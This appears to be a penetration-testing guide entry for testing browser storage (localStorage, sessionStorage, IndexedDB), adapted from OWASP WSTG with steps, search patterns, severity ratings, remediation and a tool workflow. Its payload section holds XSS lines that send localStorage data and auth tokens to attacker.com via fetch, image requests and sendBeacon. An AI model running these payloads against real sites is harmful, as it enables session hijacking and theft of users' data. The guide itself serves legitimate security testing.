---
id: WSTG-CLNT-11
title: Testing Browser Storage
category: Client-Side
severity_range: Low-Medium
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Browser_Storage
---

# WSTG-CLNT-11: Testing Browser Storage

## Summary

Modern web applications use browser storage mechanisms (localStorage, sessionStorage, IndexedDB, Web SQL, Cache API) to store data client-side. While this improves performance and enables offline functionality, sensitive data stored client-side is accessible to JavaScript (including XSS payloads), persists beyond the user's session (localStorage), and may not be properly cleared on logout. Improper use of browser storage can lead to information disclosure, session hijacking, and data leakage.

## Test Objectives

- Identify what data the application stores in browser storage
- Assess whether sensitive data (tokens, PII, credentials) is stored client-side
- Verify that browser storage is properly cleared on logout
- Check if stored data is protected against XSS-based theft
- Test for excessive data storage and data leakage

## Prerequisites

- Target application uses client-side storage
- Docker pentest container capturing traffic
- JavaScript source code accessible for analysis

## Test Steps

### Step 1: Identify Browser Storage Usage

**CLI Actions:**
Use `curl` to fetch JavaScript files and search for storage API calls:

```
GET /static/js/app.js HTTP/1.1
Host: target.com
```

Search for storage patterns:
```javascript
localStorage.setItem()
localStorage.getItem()
sessionStorage.setItem()
sessionStorage.getItem()
indexedDB.open()
window.caches.open()
```

Use `curl` to collect all JavaScript files loaded by the application.

### Step 2: Identify Sensitive Data in Storage Calls

**CLI Actions:**
Use `curl` to search JavaScript responses for storage of sensitive data:

- Pattern: `localStorage\.setItem\(.*token` (tokens in localStorage)
- Pattern: `localStorage\.setItem\(.*password` (passwords in localStorage)
- Pattern: `localStorage\.setItem\(.*key` (API keys in localStorage)
- Pattern: `sessionStorage\.setItem\(.*auth` (auth data in sessionStorage)

Analyze the JavaScript code to identify what data is stored and where:

```javascript
// Vulnerable patterns
localStorage.setItem('authToken', jwt);
localStorage.setItem('user', JSON.stringify({name: 'admin', email: 'admin@test.com', ssn: '123-45-6789'}));
localStorage.setItem('refreshToken', refreshToken);
sessionStorage.setItem('creditCard', cardNumber);
```

### Step 3: Check for Session Token Storage in localStorage

**CLI Actions:**
Use `curl` to authenticate and analyze the JavaScript that handles the response:

```
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "testuser", "password": "testpass"}
```

If the response contains a token:
```json
{"access_token": "eyJ...", "refresh_token": "abc123..."}
```

Check the JavaScript to see if these tokens are stored in localStorage (persistent, accessible to XSS) vs. sessionStorage (cleared on tab close) vs. HttpOnly cookies (not accessible to JS).

### Step 4: Check Storage Cleanup on Logout

**CLI Actions:**
Use `curl` to trigger logout and analyze the JavaScript handling:

```
POST /api/logout HTTP/1.1
Host: target.com
Authorization: Bearer <token>
```

Fetch the logout page JavaScript:
```
GET /logout HTTP/1.1
Host: target.com
```

Search for cleanup calls:
```javascript
localStorage.clear()
localStorage.removeItem('authToken')
sessionStorage.clear()
```

If the application does not clear storage on logout, tokens and sensitive data persist in the browser.

### Step 5: Check for Sensitive Data in IndexedDB

**CLI Actions:**
Use `curl` to fetch JavaScript code that interacts with IndexedDB:

```
GET /static/js/db.js HTTP/1.1
Host: target.com
```

Search for patterns:
```javascript
indexedDB.open('appDB')
store.put({...sensitiveData...})
store.add({...userData...})
```

IndexedDB can store large amounts of structured data, which may include cached API responses containing sensitive information.

### Step 6: Test for Data Leakage Across Subdomains

**CLI Actions:**
localStorage is shared across all pages of the same origin (protocol + domain + port). If the application has subdomain-based multi-tenancy or different security contexts:

Use `curl` to check if different subdomains serve JavaScript that could access shared storage:

```
GET /static/js/app.js HTTP/1.1
Host: user1.target.com
```

```
GET /static/js/app.js HTTP/1.1
Host: user2.target.com
```

Note: If both subdomains are same-origin, they share localStorage. If different origins, they do not.

Use `rynix_plugin_run('template-scan')` to check for client-side storage findings.

## Payloads

### Storage Inspection JavaScript (for manual testing)
```javascript
// Dump localStorage
for (let i = 0; i < localStorage.length; i++) {
    console.log(localStorage.key(i), localStorage.getItem(localStorage.key(i)));
}

// Dump sessionStorage
for (let i = 0; i < sessionStorage.length; i++) {
    console.log(sessionStorage.key(i), sessionStorage.getItem(sessionStorage.key(i)));
}

// List IndexedDB databases
indexedDB.databases().then(dbs => console.log(dbs));
```

### Sensitive Data Patterns to Search For
```
# In JavaScript source code
localStorage.setItem('token
localStorage.setItem('auth
localStorage.setItem('session
localStorage.setItem('password
localStorage.setItem('credit
localStorage.setItem('ssn
localStorage.setItem('api_key
localStorage.setItem('secret
localStorage.setItem('refresh
localStorage.setItem('user
```

### XSS Data Theft Payloads
```javascript
// Steal localStorage via XSS
fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(localStorage)));

// Steal specific token
new Image().src = 'https://attacker.com/steal?token=' + localStorage.getItem('authToken');

// Steal all storage data
var data = {};
for (var i = 0; i < localStorage.length; i++) {
    data[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
}
navigator.sendBeacon('https://attacker.com/steal', JSON.stringify(data));
```

## Detection Criteria

A finding should be logged when:
- Authentication tokens (JWT, refresh tokens) are stored in localStorage
- Personal data (PII, financial data) is stored in browser storage
- Passwords or credentials are stored in any browser storage mechanism
- Browser storage is not cleared on logout
- Sensitive API responses are cached in IndexedDB without encryption
- Application stores excessive amounts of data client-side
- No encryption is applied to sensitive data in browser storage

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Passwords or credentials stored in localStorage/sessionStorage | Medium |
| Authentication tokens stored in localStorage (persistent XSS theft risk) | Medium |
| Sensitive PII (SSN, credit card) stored in browser storage | Medium |
| Refresh tokens in localStorage without rotation or expiry | Medium |
| Auth tokens in sessionStorage (cleared on tab close, lower risk) | Low |
| Browser storage not cleared on logout | Low |
| Non-sensitive preferences stored in localStorage | Informational |
| All sensitive data in HttpOnly cookies, storage used for non-sensitive data only | Not a finding |

## Remediation

- Store authentication tokens in HttpOnly, Secure cookies instead of browser storage
- If localStorage must be used for tokens, implement short expiry and token rotation
- Never store passwords, credit card numbers, or highly sensitive PII in browser storage
- Clear all browser storage on logout: `localStorage.clear()`, `sessionStorage.clear()`, clear IndexedDB
- Encrypt sensitive data before storing in browser storage (note: key management is challenging client-side)
- Use sessionStorage instead of localStorage for session-scoped data
- Implement Content-Security-Policy to mitigate XSS that could steal storage data
- Minimize the amount and sensitivity of data stored client-side
- Set appropriate token expiration times for tokens stored in browser storage
- Consider using service workers with controlled caching policies

## References

- [OWASP Testing Guide - Browser Storage](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Browser_Storage)
- [CWE-922: Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)
- [MDN - Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

